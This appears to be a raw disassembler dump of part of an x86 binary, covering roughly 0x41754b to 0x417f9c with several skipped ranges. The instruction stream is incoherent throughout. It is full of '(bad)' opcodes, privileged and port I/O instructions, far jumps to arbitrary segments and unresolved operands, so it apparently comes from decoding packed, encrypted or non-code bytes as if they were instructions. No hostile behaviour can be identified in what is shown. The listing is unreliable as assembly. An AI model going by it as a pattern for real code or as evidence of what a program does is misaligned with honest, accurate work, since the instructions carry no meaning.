  41754b:	ret    0xac9b
  41754e:	pop    ebx
  41754f:	in     eax,0x82
  417551:	push   ebp
  417552:	mov    BYTE PTR [eax-0x29],cl
  417555:	aam    0xd
  417557:	adc    eax,0xa9d87636
  41755c:	outs   dx,DWORD PTR ds:[esi]
  41755d:	pop    ds
  41755e:	push   0x1199f888
  417563:	nop
  417564:	adc    al,0x9a
  417566:	dec    edx
  417567:	hlt    
  417568:	dec    esi
  417569:	test   eax,0xc6b1c740
  41756e:	push   ecx
  41756f:	push   DWORD PTR [edx-0x72]
  417572:	push   ds
  417573:	sub    DWORD PTR [edx],edi
  417575:	sub    eax,0xfe83bf53
  41757a:	push   cs
  41757b:	push   edi
  41757c:	mov    WORD PTR [ecx+0x7def0337],ds
  417582:	test   DWORD PTR ss:[esi+0x4384411f],esi
  417589:	out    0x4f,al
  41758b:	cli    
  41758c:	les    esi,FWORD PTR [ebp+0x65]
  41758f:	iret   
  417590:	mov    ch,0xd6
  417592:	mov    edx,0x8627a6e9
  417597:	xor    ebp,DWORD PTR [eax-0x6cde8a64]
  41759d:	or     BYTE PTR [edx],ah
  41759f:	add    al,0x96
  4175a1:	pop    es
  4175a2:	(bad)  
  4175a3:	sub    ebp,DWORD PTR [eax+0x1e]
  4175a6:	dec    eax
  4175a7:	jae    0x4175a1
  4175a9:	dec    ebx
  4175aa:	ror    BYTE PTR [ecx+0x12],1
  4175ad:	sahf   
  4175ae:	push   edx
  4175af:	fdiv   QWORD PTR [esi]
  4175b1:	dec    edi
  4175b2:	jmp    0x4175a8
  4175b4:	mov    WORD PTR [eax],es
	...
  417616:	test   eax,0xdf4fd367
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fmul   st,st(1)
  417623:	daa    
  417624:	fcomp  QWORD PTR [ebx-0x10]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edi+0x282b5002],dl
  417633:	outs   dx,BYTE PTR ds:[esi]
  417634:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417636:	and    eax,0x3ecf3598
  41763b:	and    BYTE PTR [eax+0x76],dh
  41763e:	sbb    dl,BYTE PTR [eax+eiz*4+0x16f4b841]
  417645:	pop    ebp
  417646:	mov    dh,0xc6
  417648:	xor    BYTE PTR [ebx+0x24fdeeae],ch
  41764e:	mov    ebp,es
  417650:	into   
  417651:	(bad)  
  417652:	bound  eax,QWORD PTR [ebx-0x4]
  417655:	inc    ecx
  417656:	and    al,0x45
  417658:	div    DWORD PTR ds:0x58a5fe13
  41765e:	addr16 aad 0x2e
  417661:	xor    al,0x90
  417663:	pop    ebx
  417664:	push   edi
  417665:	scas   eax,DWORD PTR es:[edi]
  417666:	mov    DWORD PTR [ecx-0xb],edx
  417669:	dec    ebx
  41766a:	pop    eax
  41766b:	cmp    edi,DWORD PTR cs:[eax+0x18]
  41766f:	int3   
  417670:	pop    ss
  417671:	repz mov bh,0xa
  417674:	shl    DWORD PTR [edx-0x7d],1
  417677:	loope  0x417694
  417679:	mov    esp,eax
  41767b:	call   0x1ea0:0x922362b6
  417682:	and    BYTE PTR [ebp+0x398de70f],bh
  417688:	pusha  
  417689:	test   al,0x93
  41768b:	mov    esp,0x38dc2a32
  417690:	mov    edx,0x8521618d
  417695:	xor    dl,BYTE PTR [ecx]
  417697:	dec    edi
  417698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417699:	mov    bl,0x68
  41769b:	cmp    eax,0x457e3c0e
  4176a0:	push   0x67bcd0af
  4176a5:	pop    esp
  4176a6:	ret    0x36a3
  4176a9:	aad    0x21
  4176ab:	nop
  4176ac:	or     DWORD PTR [eax-0x3d],edx
  4176af:	stos   DWORD PTR es:[edi],eax
  4176b0:	jno    0x417728
  4176b2:	sbb    ch,BYTE PTR [edx-0x2893d8bc]
  4176b8:	or     bl,BYTE PTR [ebx]
  4176ba:	loopne 0x4176af
  4176bc:	inc    edx
  4176bd:	mov    bl,0xa4
  4176bf:	cmp    al,0xea
  4176c1:	aad    0x41
  4176c3:	daa    
  4176c4:	or     ecx,eax
  4176c6:	repz bound ebp,QWORD PTR [eax+0x2a]
  4176ca:	xchg   esi,eax
  4176cb:	cli    
  4176cc:	icebp  
  4176cd:	or     esp,DWORD PTR [ecx]
  4176cf:	out    dx,eax
  4176d0:	fdiv   QWORD PTR [ebx]
  4176d2:	icebp  
  4176d3:	jle    0x41774f
  4176d5:	mov    edx,eax
  4176d7:	sub    bl,ch
  4176d9:	mov    ds:0x97ecbccf,al
  4176de:	or     BYTE PTR ss:[eax+0x73953caa],0x3f
  4176e6:	mov    ebx,0x2a71280b
  4176eb:	and    BYTE PTR [ebp*1-0x5a719424],dh
  4176f2:	fwait
  4176f3:	inc    eax
  4176f4:	outs   dx,DWORD PTR ds:[esi]
  4176f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f6:	add    al,0xf1
  4176f8:	inc    ecx
  4176f9:	adc    DWORD PTR [ecx],eax
  4176fb:	or     ebx,edi
  4176fd:	mov    al,0xfb
  4176ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417700:	mov    dh,0xa5
  417702:	aad    0xd3
  417704:	push   esp
  417705:	adc    al,0xf8
  417707:	jge    0x41772d
  417709:	mov    bl,0x63
  41770b:	push   es
  41770c:	rol    BYTE PTR [edx+edi*4+0x57],0x97
  417711:	dec    ecx
  417712:	aam    0x2c
  417714:	jns    0x41771c
  417716:	mov    ecx,0xdb7912f6
  41771b:	inc    eax
  41771c:	stc    
  41771d:	adc    bl,cl
  41771f:	scas   al,BYTE PTR es:[edi]
  417720:	inc    ebp
  417721:	push   edi
  417722:	fucom  st(7)
  417724:	mov    esp,0xc6964076
  417729:	sub    DWORD PTR [ebp-0x15626fa7],edi
  41772f:	pop    ebx
  417730:	and    eax,0xb6466db7
	...
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    DWORD PTR [edi],eax
  4177a3:	ret    
  4177a4:	or     ah,BYTE PTR [ebp-0x9]
  4177a7:	cmc    
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [edi+0x72d75082],cl
  4177b3:	mov    ds,esi
  4177b5:	es inc ecx
  4177b7:	mov    al,ds:0x318bab2c
  4177bc:	gs xchg esp,eax
  4177be:	repnz in eax,dx
  4177c0:	scas   al,BYTE PTR es:[edi]
  4177c1:	push   esi
  4177c2:	lds    esi,FWORD PTR [eax+0x12]
  4177c5:	test   al,0xd1
  4177c7:	xchg   ebp,eax
  4177c8:	mov    BYTE PTR [esi],dl
  4177ca:	js     0x417762
  4177cc:	fnsave [ebx+0x51]
  4177cf:	push   esp
  4177d0:	imul   BYTE PTR [eax-0x1b]
  4177d3:	sub    al,0x10
  4177d5:	sub    eax,0x8b2d5c98
  4177da:	(bad)  
  4177db:	aad    0xab
  4177dd:	mov    al,ds:0x34450dce
  4177e2:	(bad)  
  4177e4:	es xor eax,0x9a8f6a8b
  4177ea:	mov    al,0xe8
  4177ec:	dec    edi
  4177ed:	cli    
  4177ee:	cs inc ebx
  4177f0:	mov    eax,ds:0xc31280cb
  4177f5:	xor    cl,BYTE PTR [eax-0x66]
  4177f8:	(bad)  
  4177fa:	lahf   
  4177fb:	add    al,BYTE PTR [ebx-0x1b]
  4177fe:	xor    BYTE PTR [ebp+0x2de5f440],dh
  417804:	fidivr WORD PTR [ecx-0x32fd0dfc]
  41780a:	scas   al,BYTE PTR es:[edi]
  41780b:	push   ecx
  41780c:	int3   
  41780d:	add    DWORD PTR ds:0xef39a3d2,esi
  417813:	mov    al,ds:0x3520396d
  417818:	xchg   edx,eax
  417819:	mov    ebx,0xedd17ce1
  41781e:	je     0x4177ab
  417820:	add    al,0x29
  417822:	out    dx,eax
  417823:	(bad)  
  417824:	leave  
  417825:	je     0x4177ca
  417827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417828:	mov    esi,?
  41782a:	ret    
  41782b:	sbb    cl,BYTE PTR [edx+0x1c384b3f]
  417831:	xor    ebp,DWORD PTR [ebx+0x19]
  417834:	outs   dx,BYTE PTR ds:[esi]
  417835:	add    al,0x88
  417837:	into   
  417838:	lds    ebx,FWORD PTR ds:0xffb28dc9
  41783e:	(bad)  
  41783f:	fs fcmovne st,st(3)
  417842:	cmp    esi,DWORD PTR [eax-0x73]
  417845:	push   ss
  417846:	mov    WORD PTR [edx+0x77],ds
  417849:	inc    edx
  41784a:	or     BYTE PTR [edi-0x5e3b1a55],ch
  417850:	loop   0x417841
  417852:	mov    bh,0xf8
  417854:	ret    0x603d
  417857:	mov    edi,0x93ed605c
  41785c:	aas    
  41785d:	cmp    cl,0xb0
  417860:	xor    DWORD PTR ss:[esi-0x27],0x6
  417865:	in     eax,0x76
  417867:	js     0x417885
  417869:	xlat   BYTE PTR ds:[ebx]
  41786a:	jbe    0x41786a
  41786c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41786d:	daa    
  41786e:	and    DWORD PTR [ebp-0x74dd55b2],ebp
  417874:	mov    WORD PTR [esi],es
  417876:	js     0x417865
  417878:	iret   
  417879:	pop    edi
  41787a:	xor    BYTE PTR [ecx],0x90
  41787d:	mov    ecx,DWORD PTR [ecx+0x50772d20]
  417883:	mov    ds:0xb7c4ae2a,al
  417888:	adc    al,0x2c
  41788a:	push   cs
  41788b:	and    dl,BYTE PTR [esi]
  41788d:	repnz pop edx
  41788f:	(bad)  
  417890:	enter  0x20b1,0x3
  417894:	es cli 
  417896:	mov    ds:0xdce02a06,eax
  41789b:	sbb    eax,0x9efa747e
  4178a0:	test   eax,0xbe45dd46
  4178a5:	add    al,0x3e
  4178a7:	call   0xe83b:0xcb35cad
  4178ae:	inc    edx
  4178af:	out    dx,al
  4178b0:	dec    eax
  4178b1:	jb     0x41788d
  4178b3:	sbb    DWORD PTR [esi+0x0],esp
	...
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0xf560e3bb
  417923:	adc    bh,dh
  417925:	mov    edi,0xf6fe
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [edx+ecx*4-0x52b10a19],ah
  417934:	add    BYTE PTR [esp+ebx*2],dh
  417937:	(bad)  
  417938:	push   ds
  417939:	mov    DWORD PTR [eax+0x74],esp
  41793c:	xor    ch,BYTE PTR [ebp+0x36532a4b]
  417942:	jnp    0x417936
  417944:	or     BYTE PTR [ecx+0xd],bl
  417947:	rcl    DWORD PTR [edx],1
  417949:	push   0xffffffe5
  41794b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794c:	xchg   edx,eax
  41794d:	xchg   DWORD PTR [ecx+ebx*1],eax
  417950:	cmp    ebp,edi
  417952:	leave  
  417953:	sub    ch,bl
  417955:	sbb    al,0x7b
  417957:	lods   al,BYTE PTR ds:[esi]
  417958:	mov    ds:0x4de2803f,al
  41795d:	mov    ah,0x7b
  41795f:	jnp    0x4179a7
  417961:	fimul  WORD PTR [edx+ecx*1+0x36]
  417965:	out    0x20,al
  417967:	jg     0x41799b
  417969:	pushf  
  41796a:	dec    esp
  41796b:	lods   eax,DWORD PTR ds:[esi]
  41796c:	jo     0x4178f8
  41796e:	and    eax,0x75c3561
  417973:	cmc    
  417974:	jmp    0x1284:0x4877d178
  41797b:	imul   DWORD PTR [edi-0x711b8ad]
  417981:	fld    QWORD PTR [ebp+0x2b1754e5]
  417987:	mov    ch,BYTE PTR [edi+0x308028a1]
  41798d:	pusha  
  41798e:	(bad)  
  41798f:	jmp    0xaf7c:0xd2b58347
  417996:	(bad)  
  417998:	sub    DWORD PTR [ecx+ebx*1],ecx
  41799b:	popf   
  41799c:	je     0x4179c3
  41799e:	repnz mov ch,0x66
  4179a1:	inc    ebx
  4179a2:	adc    DWORD PTR [ebp-0x22],edx
  4179a5:	mov    esi,0x1c8e126d
  4179aa:	add    DWORD PTR [ecx+0x5a691c69],esp
  4179b0:	inc    ebp
  4179b1:	mov    edi,0xccb40d32
  4179b6:	inc    DWORD PTR [ecx]
  4179b8:	test   DWORD PTR [ebp-0x51],edi
  4179bb:	fnsave [ecx+edi*8]
  4179be:	(bad)  [ecx]
  4179c1:	pop    edi
  4179c2:	(bad)  
  4179c3:	dec    esi
  4179c4:	cwde   
  4179c5:	jnp    0x4179e2
  4179c7:	adc    al,0xa
  4179c9:	xor    eax,0x29e178e6
  4179ce:	dec    esp
  4179cf:	sub    ebx,esp
  4179d1:	xchg   ebx,eax
  4179d2:	push   ebx
  4179d3:	xor    eax,0x5b833b9d
  4179d8:	mov    esi,0x6f6ca253
  4179dd:	in     eax,dx
  4179de:	xchg   DWORD PTR [ebp-0x4afd1eb6],esp
  4179e4:	xchg   ecx,eax
  4179e5:	dec    ecx
  4179e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e7:	adc    al,0xe1
  4179e9:	lock jns 0x417a63
  4179ec:	js     0x4179c1
  4179ee:	mov    eax,0xbe709686
  4179f3:	inc    esi
  4179f4:	push   ebp
  4179f5:	cmp    bx,si
  4179f8:	mov    ah,0x2f
  4179fa:	stos   BYTE PTR es:[edi],al
  4179fb:	mov    edx,0x507a027a
  417a00:	and    esp,ecx
  417a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a03:	loop   0x4179f8
  417a05:	into   
  417a06:	sbb    ecx,ebp
  417a08:	and    BYTE PTR [ecx],ch
  417a0a:	inc    edx
  417a0b:	mov    BYTE PTR [eax+0xca172af],dh
  417a11:	mov    al,ds:0xf525e73b
  417a16:	mov    ?,WORD PTR [esi+0x698fff86]
  417a1c:	mov    ds:0xe4678381,al
  417a21:	enter  0x64ed,0x65
  417a25:	xor    BYTE PTR [ebx],ch
  417a27:	cdq    
  417a28:	inc    edx
  417a29:	test   ebp,0x72ec1f77
  417a2f:	xchg   esp,eax
  417a30:	xlat   BYTE PTR ds:[ebx]
  417a31:	jae    0x417a55
  417a33:	jmp    0x0:0x5d
	...
  417a96:	das    
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0x1e]
  417aa3:	in     al,dx
  417aa4:	int    0xce
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    bl,dl
  417aaf:	sbb    ecx,DWORD PTR [ebp-0x2552d5bd]
  417ab5:	in     al,dx
  417ab6:	into   
  417ab7:	arpl   bx,ax
  417ab9:	dec    esp
  417aba:	mov    esp,ds
  417abc:	lods   al,BYTE PTR ds:[esi]
  417abd:	loopne 0x417ab2
  417abf:	jns    0x417b06
  417ac1:	ror    DWORD PTR [edx],cl
  417ac3:	cmc    
  417ac4:	addr16 mov dl,0xbf
  417ac7:	jp     0x417a49
  417ac9:	loop   0x417ac2
  417acb:	sti    
  417acc:	sub    DWORD PTR [ebx-0x58ac4d5c],esp
  417ad2:	rol    BYTE PTR [ebp-0x3b],cl
  417ad5:	popa   
  417ad6:	push   ds
  417ad7:	out    0x61,al
  417ad9:	push   es
  417ada:	es mov ebp,0x4997d26
  417ae0:	sbb    eax,0xac309f11
  417ae5:	inc    esi
  417ae6:	scas   al,BYTE PTR es:[edi]
  417ae7:	jmp    0x55c7:0x13bc214c
  417aee:	pop    ss
  417aef:	stos   DWORD PTR es:[edi],eax
  417af0:	outs   dx,DWORD PTR ds:[esi]
  417af1:	stos   DWORD PTR es:[edi],eax
  417af2:	cmc    
  417af3:	sbb    al,0x56
  417af5:	shr    BYTE PTR [ebp+0x6690f0eb],0x2b
  417afc:	fs dec edi
  417afe:	and    BYTE PTR [ebx],al
  417b00:	fmul   QWORD PTR [edi+0x5a]
  417b03:	imul   ecx,DWORD PTR [ebp+0x39],0xffffffea
  417b07:	adc    BYTE PTR [ecx+0x46e95ebd],dl
  417b0d:	jb     0x417b3d
  417b0f:	jle    0x417b37
  417b11:	jns    0x417ad2
  417b13:	test   eax,0x5225dc08
  417b18:	cmc    
  417b19:	add    esp,edx
  417b1b:	or     BYTE PTR [eax+0x41],0x96
  417b1f:	add    al,0x65
  417b21:	inc    edx
  417b22:	sub    bl,bl
  417b24:	and    ebp,esp
  417b26:	pop    esp
  417b27:	das    
  417b28:	inc    ebp
  417b29:	sub    al,BYTE PTR [edi+0x2dec2196]
  417b2f:	pusha  
  417b30:	in     al,0xee
  417b32:	pop    es
  417b33:	es dec ecx
  417b35:	jle    0x417b8a
  417b37:	and    dh,BYTE PTR [ecx+0x17]
  417b3a:	out    dx,al
  417b3b:	cmc    
  417b3c:	aas    
  417b3d:	outs   dx,BYTE PTR ds:[esi]
  417b3e:	sahf   
  417b3f:	xor    esi,ebp
  417b41:	mov    dl,0x6a
  417b43:	xchg   edx,eax
  417b44:	inc    esp
  417b45:	pop    ebx
  417b46:	pushf  
  417b47:	ds test BYTE PTR ds:[ebx],al
  417b4b:	sahf   
  417b4c:	(bad)  
  417b4d:	cmp    eax,0x3982a9cb
  417b52:	mov    BYTE PTR [eax],al
  417b54:	pop    ss
  417b55:	sbb    eax,0x25227143
  417b5a:	inc    eax
  417b5b:	cmp    bh,BYTE PTR ss:[eax]
  417b5e:	push   ds
  417b5f:	lock jne 0x417bc4
  417b62:	jle    0x417b64
  417b64:	int3   
  417b65:	push   edi
  417b66:	call   0x6d3b:0x5d3ba7cf
  417b6d:	mov    ds:0x96eff7c,al
  417b72:	mov    esi,0x68b473d9
  417b77:	xchg   esp,eax
  417b78:	ret    
  417b79:	pop    ecx
  417b7a:	cwde   
  417b7b:	pop    esp
  417b7c:	dec    eax
  417b7d:	in     al,dx
  417b7e:	add    eax,0xfae2f8e7
  417b83:	ds cli 
  417b85:	or     eax,0x1390c671
  417b8a:	stc    
  417b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b8c:	push   esi
  417b8d:	imul   ebx,DWORD PTR [ebx+0x1b535ca3],0x9e4a5667
  417b97:	jno    0x417ba5
  417b99:	jge    0x417b97
  417b9b:	jb     0x417b8e
  417b9d:	std    
  417b9e:	mov    dh,0xb9
  417ba0:	or     BYTE PTR [ebx+eax*4-0x67],dl
  417ba4:	cmp    DWORD PTR [edi+edi*2-0x2afd53af],ecx
  417bab:	es push ds
  417bad:	aaa    
  417bae:	and    esi,DWORD PTR [edx-0x4d]
  417bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb2:	stc    
  417bb3:	out    dx,eax
  417bb4:	mov    al,ds:0x0
	...
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xfb
  417c23:	or     al,0xd
  417c25:	das    
  417c26:	or     al,0xf9
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [edx+ebp*1],ah
  417c30:	popf   
  417c31:	jmp    0x5278:0xc02c3a90
  417c38:	add    BYTE PTR [ecx],cl
  417c3a:	lock inc esi
  417c3c:	cmp    DWORD PTR [edi],0xffffff93
  417c3f:	add    al,0x1a
  417c41:	(bad)  
  417c42:	in     al,0xbc
  417c44:	and    al,0x54
  417c46:	lahf   
  417c47:	mov    ch,bl
  417c49:	or     ch,BYTE PTR [eax]
  417c4b:	retf   0xe991
  417c4e:	retf   
  417c4f:	mov    dl,0xdc
  417c51:	sbb    dh,cl
  417c53:	sahf   
  417c54:	cmp    DWORD PTR [eax-0x1a7e37f8],edx
  417c5a:	dec    ecx
  417c5b:	sti    
  417c5c:	scas   al,BYTE PTR es:[edi]
  417c5d:	jne    0x417c11
  417c5f:	cmp    BYTE PTR [edx+edi*2-0x37],ah
  417c63:	mov    al,ds:0xdcf43522
  417c68:	xor    al,0x66
  417c6a:	or     BYTE PTR [edi-0x4ff008db],bh
  417c70:	aad    0x91
  417c72:	sub    al,ah
  417c74:	or     dl,BYTE PTR [esi]
  417c76:	shr    BYTE PTR [ebx+0x31],0x1f
  417c7a:	inc    esi
  417c7b:	inc    edi
  417c7c:	inc    ecx
  417c7d:	jmp    0x417c5d
  417c7f:	stos   BYTE PTR es:[edi],al
  417c80:	out    0x25,eax
  417c82:	xchg   ecx,eax
  417c83:	mov    ecx,0xb49bf689
  417c88:	call   0x8735:0xec4a0c0a
  417c8f:	inc    esp
  417c90:	loope  0x417c76
  417c92:	mov    eax,0x6b4a79e1
  417c97:	jbe    0x417cbd
  417c99:	push   es
  417c9a:	cs jb  0x417cd7
  417c9d:	mov    ds:0x30fdd38b,al
  417ca2:	sub    edx,ebp
  417ca4:	lock das 
  417ca6:	iret   
  417ca7:	or     ch,BYTE PTR [esi-0x5263cbd1]
  417cad:	les    esp,FWORD PTR [ebx-0x12bf7532]
  417cb3:	pop    edx
  417cb4:	cmp    BYTE PTR [edx+0x5447638b],0xc1
  417cbb:	je     0x417d25
  417cbd:	and    DWORD PTR [ebx-0x3018d1c7],esi
  417cc3:	or     DWORD PTR ds:0xf24b6983,0x52195501
  417ccd:	repnz adc eax,0x2bdd0943
  417cd3:	jns    0x417d29
  417cd5:	lods   eax,DWORD PTR ds:[esi]
  417cd6:	and    eax,0x57c765bd
  417cdb:	pop    ss
  417cdc:	xchg   dl,bl
  417cde:	sbb    bh,BYTE PTR [edx]
  417ce0:	call   0x9e093573
  417ce5:	push   es
  417ce6:	inc    ebp
  417ce7:	xlat   BYTE PTR ds:[ebx]
  417ce8:	jp     0x417d07
  417cea:	jge    0x417d10
  417cec:	lea    eax,[eax+0x38]
  417cef:	pop    ds
  417cf0:	push   ebp
  417cf1:	lea    esp,[eax+0x66f96426]
  417cf7:	lods   eax,DWORD PTR ds:[esi]
  417cf8:	or     esi,DWORD PTR [edi-0x7]
  417cfb:	ret    0x1ab5
  417cfe:	inc    esi
  417cff:	leave  
  417d00:	out    0xc6,eax
  417d02:	inc    ebp
  417d03:	jns    0x417cbe
  417d05:	mov    eax,ds:0x3e6a92fe
  417d0a:	inc    edi
  417d0b:	rol    BYTE PTR [eax-0x18fa3fc9],0x30
  417d12:	cmc    
  417d13:	outs   dx,BYTE PTR ds:[esi]
  417d14:	push   edx
  417d15:	sbb    eax,0x9a4a6d96
  417d1a:	dec    esi
  417d1b:	jbe    0x417d7e
  417d1d:	stos   BYTE PTR es:[edi],al
  417d1e:	mov    cl,0x8d
  417d20:	nop
  417d21:	xchg   ecx,eax
  417d22:	fstp   DWORD PTR [esi]
  417d24:	and    ah,cl
  417d26:	shl    ebp,0x2a
  417d29:	adc    ch,BYTE PTR [edx]
  417d2b:	jg     0x417d87
  417d2d:	inc    esi
  417d2e:	push   esp
  417d2f:	jge    0x417d1e
  417d31:	pop    ds
  417d32:	or     bl,cl
  417d34:	dec    esi
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x4e
  417da3:	mov    eax,ds:0xfa13f0c3
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    bh,al
  417daf:	sbb    DWORD PTR [esi-0x6754ffe8],ecx
  417db5:	test   eax,0x8f6d734e
  417dba:	aam    0x3e
  417dbc:	jg     0x417d7e
  417dbe:	(bad)  
  417dbf:	aaa    
  417dc0:	jg     0x417e0a
  417dc2:	inc    eax
  417dc3:	scas   eax,DWORD PTR es:[edi]
  417dc4:	nop
  417dc5:	jae    0x417d63
  417dc7:	test   DWORD PTR [ebx-0x347e4333],ebp
  417dcd:	aad    0xa6
  417dcf:	xor    DWORD PTR [esi+0x1027274e],0xffffffb8
  417dd6:	mov    WORD PTR [esi],?
  417dd8:	mov    esp,0x8ae2649a
  417ddd:	sub    DWORD PTR [ebp+eiz*8-0x75],0xe4b1c87
  417de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417de6:	jo     0x417dc8
  417de8:	mov    dh,0x91
  417dea:	jo     0x417e10
  417dec:	xlat   BYTE PTR ds:[ebx]
  417ded:	sbb    cl,bl
  417def:	inc    ebx
  417df0:	(bad)  
  417df1:	jnp    0x417df4
  417df3:	add    BYTE PTR [ecx+0x6b],dh
  417df6:	ins    DWORD PTR es:[edi],dx
  417df7:	retf   
  417df8:	cli    
  417df9:	pop    ebx
  417dfa:	cmp    dl,bh
  417dfc:	cmp    DWORD PTR [edi-0x2b406ebc],0x7947bba0
  417e06:	add    al,0xa0
  417e08:	fnstcw WORD PTR [eax+ebx*2-0x5a892e4e]
  417e0f:	jmp    0x4aa1:0x517eabab
  417e16:	sub    ebp,edi
  417e18:	fnsave [esi]
  417e1a:	int    0xa6
  417e1c:	adc    esi,DWORD PTR [esi]
  417e1e:	xchg   DWORD PTR [ecx-0x4f],esi
  417e21:	jne    0x417dc8
  417e23:	or     BYTE PTR [edx],0x45
  417e26:	jp     0x417e66
  417e28:	inc    ebx
  417e29:	sbb    eax,0x19aefee5
  417e2e:	call   FWORD PTR [edx-0x3732352f]
  417e34:	shl    BYTE PTR [esi-0x22902e97],0xd
  417e3b:	je     0x417e6d
  417e3d:	mov    edx,0x41c00d4
  417e42:	and    al,0x81
  417e44:	xchg   ebx,eax
  417e45:	pop    es
  417e46:	std    
  417e47:	jb     0x417e29
  417e49:	jne    0x417df4
  417e4b:	push   edx
  417e4c:	sbb    edi,esp
  417e4e:	jecxz  0x417e52
  417e50:	cmp    DWORD PTR [edx-0x5ff7cae2],esp
  417e56:	js     0x417e6f
  417e58:	jecxz  0x417e0c
  417e5a:	push   cs
  417e5b:	clc    
  417e5c:	aad    0x8a
  417e5e:	push   eax
  417e5f:	pop    esi
  417e60:	aad    0x2
  417e62:	jmp    0xd38b:0xc3a2005f
  417e69:	mov    dh,0xd1
  417e6b:	push   edx
  417e6c:	xchg   ecx,eax
  417e6d:	aad    0xca
  417e6f:	aad    0xbe
  417e71:	or     DWORD PTR [ecx-0x3d],ecx
  417e74:	adc    edi,DWORD PTR ss:[ebp-0x3b7eea9c]
  417e7b:	mov    dl,0x34
  417e7d:	mov    al,ds:0xdecffa46
  417e82:	dec    ebx
  417e83:	mov    edi,0x4e0ea901
  417e88:	lods   al,BYTE PTR ds:[esi]
  417e89:	test   al,0xc4
  417e8b:	mov    cl,ah
  417e8d:	pusha  
  417e8e:	leave  
  417e8f:	dec    esp
  417e90:	adc    esp,eax
  417e92:	jae    0x417e79
  417e94:	mov    cl,0x8b
  417e96:	stos   BYTE PTR es:[edi],al
  417e97:	aad    0x26
  417e99:	call   0x2f70:0x32b075bc
  417ea0:	sahf   
  417ea1:	out    0xdb,al
  417ea3:	cmp    cl,al
  417ea5:	in     al,0x49
  417ea7:	sar    BYTE PTR [esi+0x7e],cl
  417eaa:	xor    eax,0x977109cd
  417eaf:	test   BYTE PTR [ebp-0x2cab75fd],ah
	...
  417f15:	add    BYTE PTR [edx-0x1a],ah
  417f18:	out    0x3b,al
  417f1a:	out    0x3b,al
  417f1c:	(bad)  
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	not    BYTE PTR [esi]
  417f24:	mov    bl,0x3d
  417f26:	sbb    bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [edx],bl
  417f2f:	or     dl,cl
  417f31:	ficom  DWORD PTR [ebp+0x18a084d5]
  417f37:	and    DWORD PTR [edi],ebx
  417f39:	sub    al,0x19
  417f3b:	mov    al,0xd4
  417f3d:	inc    ebx
  417f3e:	pop    es
  417f3f:	dec    ebp
  417f40:	add    BYTE PTR [edx+0x77],ch
  417f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f44:	mov    eax,ds
  417f46:	pop    esi
  417f47:	ds or  edi,0xabba054f
  417f4e:	cmp    cl,BYTE PTR [esi+0xa]
  417f51:	gs inc esi
  417f53:	xchg   esp,eax
  417f54:	adc    eax,0x4cc925ba
  417f59:	cs out 0x25,al
  417f5c:	loopne 0x417fa3
  417f5e:	dec    ebp
  417f5f:	fild   QWORD PTR [esp+eax*8+0x33d53199]
  417f66:	sbb    DWORD PTR [ebx+0x60131f00],eax
  417f6c:	int    0x79
  417f6e:	mov    edx,0x3fe9fbb7
  417f73:	mov    edi,0x1813a5bc
  417f78:	mov    cl,0x52
  417f7a:	pop    esp
  417f7b:	lods   al,BYTE PTR ds:[esi]
  417f7c:	xchg   DWORD PTR [ebx-0x7f],edx
  417f7f:	hlt    
  417f80:	pop    ecx
  417f81:	mov    BYTE PTR [ebp-0x6a],dl
  417f84:	pushf  
  417f85:	pop    esp
  417f86:	xor    al,0x73
  417f88:	inc    edx
  417f89:	pop    fs
  417f8b:	jle    0x417fa3
  417f8d:	jmp    0x418004
  417f8f:	mov    bh,0xc2
  417f91:	jl     0x417f35
  417f93:	in     eax,dx
  417f94:	xchg   edx,eax
  417f95:	push   esi
  417f96:	in     al,dx
  417f97:	es iret 
  417f99:	lea    ecx,[edi]
  417f9b:	inc    edx
  417f9c:	pop    esp
